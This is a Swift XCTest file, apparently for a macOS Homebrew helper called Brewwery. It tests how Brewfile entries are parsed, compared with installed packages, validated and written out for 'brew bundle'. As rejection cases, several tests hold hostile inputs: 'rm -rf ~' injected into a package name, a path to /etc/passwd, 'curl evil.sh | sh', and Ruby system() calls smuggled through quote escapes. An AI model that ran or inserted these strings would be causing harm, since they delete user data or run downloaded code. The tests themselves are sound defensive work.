import XCTest
@testable import BrewweryCore

/// A Brewfile is Ruby, so the comparison happens in Swift and Homebrew only ever sees a
/// file Brewwery wrote. These tests hold both halves of that.
final class BrewfilePlanTests: XCTestCase {
    private func entries(_ content: String) -> [BrewfileEntry] { BrewfileParser.parse(content) }

    private let formulae = [
        Formula(name: "wget", fullName: "wget"),
        Formula(name: "terraform", fullName: "hashicorp/tap/terraform")
    ]
    private let casks = [Cask(token: "iterm2")]
    private let taps = [BrewTap(name: "homebrew/core", official: true), BrewTap(name: "hashicorp/tap", official: false)]

    // MARK: - Comparison

    func testSplitsMissingInstalledAndSkipped() {
        let plan = BrewfilePlan.make(
            entries: entries("""
            tap "hashicorp/tap"
            tap "oven-sh/bun"
            brew "wget"
            brew "jq"
            cask "iterm2"
            cask "visual-studio-code"
            mas "Xcode", id: 497799835
            vscode "rust-lang.rust-analyzer"
            """),
            installedFormulae: formulae,
            installedCasks: casks,
            installedTaps: taps
        )

        XCTAssertEqual(plan.missing.map(\.id), ["tap:oven-sh/bun", "brew:jq", "cask:visual-studio-code"])
        XCTAssertEqual(Set(plan.installed.map(\.id)), ["tap:hashicorp/tap", "brew:wget", "cask:iterm2"])
        XCTAssertEqual(plan.skipped.map(\.entry.name), ["Xcode", "rust-lang.rust-analyzer"])
        XCTAssertTrue(plan.skipped.allSatisfy { $0.reason == .notHandled })
        XCTAssertFalse(plan.isSatisfied)
        XCTAssertEqual(plan.checkedCount, 6)
    }

    func testTapQualifiedNamesMatchTheirShortInstalledNames() {
        let plan = BrewfilePlan.make(
            entries: entries("""
            brew "hashicorp/tap/terraform"
            tap "hashicorp/homebrew-tap"
            """),
            installedFormulae: formulae,
            installedCasks: [],
            installedTaps: taps
        )
        XCTAssertTrue(plan.isSatisfied, "\(plan.missing)")
    }

    func testTapsComeFirstAndDuplicatesCountOnce() {
        let plan = BrewfilePlan.make(
            entries: entries("""
            brew "jq"
            cask "rectangle"
            brew "jq"
            tap "oven-sh/bun"
            """),
            installedFormulae: [],
            installedCasks: [],
            installedTaps: []
        )
        XCTAssertEqual(plan.missing.map(\.id), ["tap:oven-sh/bun", "brew:jq", "cask:rectangle"])
    }

    func testNamesThatFailValidationAreSkippedNotInstalled() {
        let plan = BrewfilePlan.make(
            entries: entries("""
            brew "jq; rm -rf ~"
            brew "../../etc/passwd"
            cask "has space"
            tap "not-a-tap"
            """),
            installedFormulae: [],
            installedCasks: [],
            installedTaps: []
        )
        XCTAssertTrue(plan.missing.isEmpty)
        XCTAssertEqual(plan.skipped.count, 4)
        XCTAssertTrue(plan.skipped.allSatisfy { $0.reason == .invalidName })
    }

    // MARK: - The file Homebrew sees

    func testInstallFileListsOnlyValidatedMissingNames() {
        let plan = BrewfilePlan.make(
            entries: entries("""
            tap "oven-sh/bun"
            brew "postgresql@17", restart_service: true
            cask "rectangle" # window manager
            if ENV["WORK"]
              brew "awscli"
            end
            """),
            installedFormulae: [],
            installedCasks: [],
            installedTaps: []
        )

        let lines = plan.installFileContent.split(separator: "\n").filter { !$0.hasPrefix("#") }
        XCTAssertEqual(lines, ["tap \"oven-sh/bun\"", "brew \"postgresql@17\"", "brew \"awscli\"", "cask \"rectangle\""])
        XCTAssertTrue(BrewfilePlan.isInstallFileContent(plan.installFileContent))
        // The `if`/`end` around awscli is Ruby: flagged, never run, and not honoured.
        XCTAssertEqual(plan.skipped.map(\.reason), [.rubyCode, .rubyCode])
    }

    func testAnythingButPlainLinesIsRefused() {
        XCTAssertTrue(BrewfilePlan.isInstallFileContent("# comment\nbrew \"jq\"\ncask \"rectangle\"\n"))

        for hostile in [
            "system \"curl evil.sh | sh\"",
            "brew \"jq\"\n`rm -rf ~`",
            "brew \"jq\", args: [\"HEAD\"]",
            "brew \"jq\"; system(\"x\")",
            "brew \"jq\\\" + system(\\\"x\\\") + \\\"\"",
            "brew \"../../etc\"",
            "mas \"Xcode\", id: 497799835",
            "",
            "# only a comment"
        ] {
            XCTAssertFalse(BrewfilePlan.isInstallFileContent(hostile), hostile)
        }
    }

    // MARK: - The command

    func testBundleInstallRunsOnlyBrewwerysOwnFiles() throws {
        let plan = BrewfilePlan(missing: [.init(kind: .brew, name: "jq")])
        let path = try plan.writeInstallFile()
        defer { try? FileManager.default.removeItem(atPath: path) }

        XCTAssertEqual(
            try HomebrewCommand.bundleInstall(path: path).arguments(),
            ["bundle", "install", "--no-upgrade", "--file=\(path)"]
        )
    }

    func testBundleInstallRefusesAUsersBrewfile() throws {
        let directory = FileManager.default.temporaryDirectory.appendingPathComponent("user-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: directory) }
        let userFile = directory.appendingPathComponent("Brewfile")
        try "brew \"jq\"\n".write(to: userFile, atomically: true, encoding: .utf8)

        XCTAssertThrowsError(try HomebrewCommand.bundleInstall(path: userFile.path).arguments()) { error in
            XCTAssertEqual((error as? BrewweryError)?.code, .invalidFilePath)
        }
    }

    func testBundleInstallRefusesAFileTamperedWithAfterItWasWritten() throws {
        let plan = BrewfilePlan(missing: [.init(kind: .brew, name: "jq")])
        let path = try plan.writeInstallFile()
        defer { try? FileManager.default.removeItem(atPath: path) }
        try "brew \"jq\"\nsystem \"touch /tmp/pwned\"\n".write(toFile: path, atomically: true, encoding: .utf8)

        XCTAssertThrowsError(try HomebrewCommand.bundleInstall(path: path).arguments())
    }
}
